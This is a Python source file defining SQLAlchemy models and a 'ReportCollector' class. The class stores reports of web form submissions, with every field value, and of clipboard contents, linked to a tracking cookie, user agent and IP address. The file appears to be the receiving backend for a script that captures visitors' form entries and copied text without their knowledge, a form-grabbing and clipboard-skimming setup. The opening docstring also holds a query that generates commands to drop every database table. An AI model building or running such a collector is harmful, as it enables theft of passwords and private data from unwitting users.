"""
select 'drop table ' || name || ';' from sqlite_master where type = 'table';
"""

from sqlalchemy import Column, String, Integer, ForeignKey, DateTime
from sqlalchemy.orm import relationship, backref, sessionmaker
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import create_engine
from datetime import datetime

from json import dumps

Base = declarative_base()


class User(Base):
    __tablename__ = "User"
    id = Column(Integer, primary_key=True)
    user_agent = Column(String)

    def __repr__(self):
        return "<User (id=%d, user_agent=%s)>" % (self.id, self.user_agent)


class ReportBase(Base):
    __tablename__ = "ReportBase"
    id = Column(Integer, primary_key=True)
    timestamp = Column(DateTime, default=datetime.utcnow)
    report_type = Column(String(50))
    location = Column(String)
    ip = Column(String(20))

    user_id = Column(Integer, ForeignKey("User.id"))
    user = relationship("User", backref=backref("reports"))

    __mapper_args__ = {
        "polymorphic_identity": __tablename__,
        "polymorphic_on": report_type
    }

    def __init__(self, request, report, *args, **kvargs):
        super(ReportBase, self).__init__(*args, **kvargs)
        self.location = report.get("l")
        self.ip = request.remote_ip

    def __repr__(self):
        return "<ReportBase (id=%s, user_id=%s, type=%s, timestamp=%s, location=%s, ip=%s)>" % (self.id, self.user_id, self.report_type, self.timestamp, self.location, self.ip)


class FormSubmitReport(ReportBase):
    __tablename__ = "FormSubmitReport"
    id = Column(Integer, ForeignKey("ReportBase.id"), primary_key=True)
    action = Column(String)
    method = Column(String)
    data = Column(String)

    __mapper_args__ = {
        "polymorphic_identity": __tablename__
    }

    def __init__(self, request, report, *args, **kvargs):
        super(FormSubmitReport, self).__init__(request, report, *args, **kvargs)
        report_data = report["d"]
        self.action = report_data["a"]
        self.method = report_data["m"]
        self.data = dumps(report_data["d"])

    def __repr__(self):
        return (super(FormSubmitReport, self).__repr__() + " / <FormSubmitReport (action=%s, method=%s, values=%s)>" % (self.action, self.method, self.data)).encode("utf-8")


class ClipboardReport(ReportBase):
    __tablename__ = "ClipboardReport"
    id = Column(Integer, ForeignKey("ReportBase.id"), primary_key=True)
    type = Column(String(10))
    data = Column(String)

    __mapper_args__ = {
        "polymorphic_identity": __tablename__
    }

    def __init__(self, request, report, *args, **kvargs):
        super(ClipboardReport, self).__init__(request, report, *args, **kvargs)
        report_data = report["d"]
        self.type = report_data["t"]
        self.data = report_data["d"]

    def __repr__(self):
        return (super(ClipboardReport, self).__repr__() + " / <ClipboardReport (type=%s, data=%s)>" % (self.type, self.data)).encode("utf-8")


class ReportCollector:
    def __init__(self):
        self.Session = None
        self._setup_db()

    def _setup_db(self):
        # engine = create_engine('sqlite:///:memory:', echo=True)
        engine = create_engine('sqlite:////Users/vilco/Downloads/pds.db', echo=False)
        Base.metadata.create_all(engine)
        self.Session = sessionmaker(bind=engine)

    def get_reports(self):
        session = self.Session()
        users = []
        for user in session.query(User).all():
            users.append({
                "id": user.id,
                "user-agent": user.user_agent,

            })

        return {
            "users": users
        }

    def save(self, request, report_info):
        session = self.Session()

        # Retrieve existing user from db or create new
        user_id_cookie = request.cookies.get("id")
        user = None
        if user_id_cookie:
            user = session.query(User).get(user_id_cookie.value)
        if not user:
            user = User(user_agent=request.headers.get("User-Agent"))
            session.add(user)

        report_type = report_info.get("t")
        if report_type == "formSubmit":
            report = FormSubmitReport(request, report_info)
        elif report_type == "clipboard":
            report = ClipboardReport(request, report_info)
        else:
            raise Exception("Unknown report type: %s" % report_type)

        user.reports.append(report)
        session.commit()

        print report

        return user, report

